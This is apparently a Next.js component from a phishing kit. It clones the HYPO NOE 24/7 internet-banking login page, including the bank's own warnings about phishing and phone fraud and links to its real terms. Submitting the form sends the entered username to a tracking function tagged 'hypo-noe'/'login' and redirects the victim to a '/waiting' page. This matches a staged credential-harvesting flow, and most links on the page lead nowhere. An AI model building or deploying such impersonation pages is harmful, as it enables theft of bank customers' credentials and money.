"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { trackSubmission } from "@/lib/track";

export default function LoginForm() {
  const router = useRouter();
  const [username, setUsername] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    await trackSubmission("hypo-noe", "login", { username });
    router.push(`/waiting?user=${encodeURIComponent(username)}`);
  };

  return (
    <>
      {/* Header with logo */}
      <div className="login-header">
        <span className="sr-only">Firmenlogo</span>
        <div id="topbar" className="topbar pre-login">
          <div className="container">
            <div className="row">
              <div className="topbar-logo"></div>
            </div>
          </div>
        </div>
      </div>

      {/* Main login area */}
      <div className="leave-header-visible" id="overlaycontainer-login">
        <form id="loginform" className="login-pin-column" onSubmit={handleSubmit}>
          <div id="modaloverlay" className="modal show" role="dialog">
            <div className="modal-dialog">
              <div className="modal-content">
                {/* Modal Header */}
                <div className="modal-header">
                  <h1>Login 24/7 Internetbanking</h1>
                </div>

                {/* Modal Body */}
                <div className="modal-body">
                  {/* Security Teaser */}
                  <div className="securityteaser-wrapper">
                    <a
                      className="command-link"
                      href="#"
                      aria-label="ACHTUNG: Warnung vor Phishing-SMS rund um ID Austria!"
                    >
                      <span className="command-link-icon">
                        <div className="securityteaser-box">
                          <div className="securityteaser-content">
                            <div className="icon">
                              <span className="icon icon-sicherheitsteaser">⚠</span>
                            </div>
                            <div className="teaser">
                              <b><br /></b>
                              <b>ACHTUNG: Warnung vor Phishing-SMS rund um ID Austria!</b>
                              <br /><br />
                              <b>ACHTUNG: Warnung vor Betrüger, die sich am Telefon als Bankmitarbeiterin oder Bankmitarbeiter der HYPO NOE ausgeben!</b>
                              <br /><br />
                              Informieren Sie sich hier ...
                              <br /><br />
                            </div>
                          </div>
                        </div>
                      </span>
                    </a>
                  </div>

                  {/* Messages overlay (hidden) */}
                  <div id="loginform-messages" className="messages-overlay hidden"></div>

                  {/* Info text */}
                  <div className="row login-row login-info-text">
                    <p>
                      Beim Login wird eine sichere Verbindung aufgebaut. Bitte halten Sie Ihre Anmeldedaten geheim und achten Sie darauf, dass Sie Ihre Anmeldedaten auf keiner Ihnen unbekannten Seite eingeben. Unsere Mitarbeiter werden Sie niemals nach Ihren Anmeldedaten befragen.{" "}
                      <br aria-hidden="true" /><br aria-hidden="true" />
                      Bitte beachten Sie unsere{" "}
                      <a href="https://www.hyponoe.at/services/sicherheitszentrum" target="_blank" rel="noopener noreferrer">
                        Sicherheitsempfehlungen
                      </a>.
                    </p>
                  </div>

                  {/* Divider */}
                  <div className="row login-row login-demo">
                    <hr className="no-margin-top" role="presentation" />
                  </div>

                  {/* Username input */}
                  <div className="row">
                    <div className="col-xs-12">
                      <div className="pull-right">
                        {" "}
                        <a className="command-link" href="#">
                          <span className="command-link-wrap">
                            <span className="command-link-title">Barrierefrei</span>
                          </span>
                        </a>
                        {" "}
                      </div>

                      <label htmlFor="benutzername">
                        <small>Benutzername</small>
                      </label>
                      <div className="input-text">
                        <input
                          id="benutzername"
                          name="loginform:benutzername"
                          type="text"
                          className="form-control"
                          maxLength={64}
                          spellCheck={false}
                          autoComplete="off"
                          placeholder=""
                          value={username}
                          onChange={(e) => setUsername(e.target.value)}
                        />
                        <a
                          className="del-btn"
                          tabIndex={-1}
                          onClick={() => setUsername("")}
                          style={{ display: username ? "block" : "none" }}
                        >
                          <span className="icon icon-inhalt-loeschen">✕</span>
                        </a>
                      </div>
                    </div>
                  </div>

                  {/* Empty row (like original) */}
                  <div className="row"></div>

                  {/* Erstlogin link */}
                  <a href="#" aria-label="Erstmalige Anmeldung? Hier klicken, um zu starten">
                    <div className="login-erstlogin-link">Sie melden sich zum ersten Mal an?</div>
                  </a>

                  {/* Terms */}
                  <div className="row login-nutzungsbedingungen">
                    <p>
                      Mit dem Login stimmen Sie den{" "}
                      <a href="https://www.hyponoe.at/de/veroffentlichungen/hypo-noe-gruppe/agb" target="_blank" rel="noopener noreferrer">AGB</a>
                      {" "}und{" "}
                      <a href="https://www.hyponoe.at/de/veroffentlichungen/hypo-noe-gruppe/agb" target="_blank" rel="noopener noreferrer">Nutzungsbedingungen</a>
                      {" "}sowie der{" "}
                      <a href="https://www.hyponoe.at/de/rechtliche-hinweise/datenschutz" target="_blank" rel="noopener noreferrer">Datenschutzerklärung</a>
                      {" "}der HYPO NOE Landesbank für Niederösterreich und Wien AG ausdrücklich zu.
                    </p>
                  </div>

                  {/* Submit button footer */}
                  <div className="modal-footer">
                    <div className="row">
                      <button
                        id="loginButtonNext"
                        type="submit"
                        className="button-default pull-right button-fullwidth"
                        aria-label="Continue logging in"
                      >
                        Weiter
                      </button>
                    </div>
                  </div>

                  {/* Recovery links footer */}
                  <div className="modal-footer">
                    <div className="row text-center">
                      <a className="command-link" href="#">
                        <span className="command-link-wrap">
                          <span className="command-link-title">Benutzername vergessen?</span>
                        </span>
                      </a>
                      <br /><br />
                      <a className="command-link" href="#" aria-label="Live-Hilfe-Dialog öffnen">
                        <span className="command-link-wrap">
                          <span className="command-link-icon">
                            <span className="icon icon-hilfe">?</span>
                          </span>
                          <span className="command-link-title">Live Hilfe</span>
                        </span>
                      </a>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </form>
      </div>
    </>
  );
}
